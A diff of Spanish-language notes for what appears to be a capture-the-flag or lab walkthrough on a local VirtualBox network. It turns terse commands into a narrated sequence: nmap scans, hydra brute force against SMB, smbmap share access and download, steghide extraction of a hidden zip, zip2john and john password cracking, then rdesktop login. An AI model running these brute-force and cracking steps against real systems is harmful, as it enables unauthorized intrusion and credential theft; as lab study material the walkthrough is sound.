@@ -1,18 +1,40 @@
-Hydra al smb:
-hydra -L user.txt -P pass.txt IP smb
+User.txt
+Empezamos verificando que se ha creado una interfaz de red llamada vboxnet0:
+    - ifconfig
 
+Empezamos escaneado la red con nmap:
+    - Descubrir cuantos hosts hay -> nmap 192.168.56.0/24 -sn -T5
+    - Escaneado de todos los puertos -> nmap -p- -sS --min-rate 5000 --open -vvv IP -oN ports 
+    - Escaneo en profundidad de los puertos abiertos -> nmap -p(lista de puestos) -sCV --min-rate 5000 IP (Ej: nmap -p22,80 -sCV --min-rate 5000 IP )
+ 
+Vemos que el servicio smb esta abierto. Probamos hacer un ataque de fuerza bruta a este servicio:
+    - Utilizar los siguientes diccionarios -> ./diccionarios/names.txt y ./diccionarios/passwords.txt 
+
+    - hydra -L names.txt -P passwords.txt IP smb
+
+Y encontramos una credencial valida. Intentamos conectarnos con rdesktop, pero no deja.
+
+Probamos a usar smbmap para ver si hay algun recurso comapartido al que tengamos acceso.
 Ver carpetas compartidas:
-smbmap -H IP -u user -p pass
-smbmap -H IP -u user -p pass -r folder
+    - smbmap -H IP -u user -p pass
+        Vemoc que hay una carpeta llamada folder a la que tenemos acceso de lectura, miramos dentro.
+    - smbmap -H IP -u user -p pass -r folder
 
-Descargar archivo:
-smbmap -H IP -u user -p pass --download path/file
+Parece que hay una imagen, la descargamos para verla:
+    - smbmap -H IP -u user -p pass --download path/file
 
-Extraer archivo de la foto:
-steghide extract -sf image
+Hacemos file image.jpeg, para ver si de verdad es una imagen y efectivamente es una imagen. La abrimos y no nos dice nada en especial.
 
-Obtener hash zip:
-zip2john secret.zip > hash
+Miramos los metadatos del archivo con exiftool, pero tampoco vemos nada interesante. 
 
-Romper hash:
-john -w wordlist hash
+Probamos a buscar archivos ocultos en la imagen:
+    - steghide extract -sf image
+y descubrimos un .zip oculto. Pero no podemo abrirlo porque se necesita una contraseña. Vamos a guardarnos el hash de la contraseña del zip y a crackearlo despues con john:
+    - Obtener hash zip:
+        zip2john secret.zip > hash
+
+    - Romper hash:
+        john -w passwords.txt hash
+
+
+Conseguimos la contraseña y dentro hay una credencial. Nos conectamos con rdekstop usando esta nueva credencial.
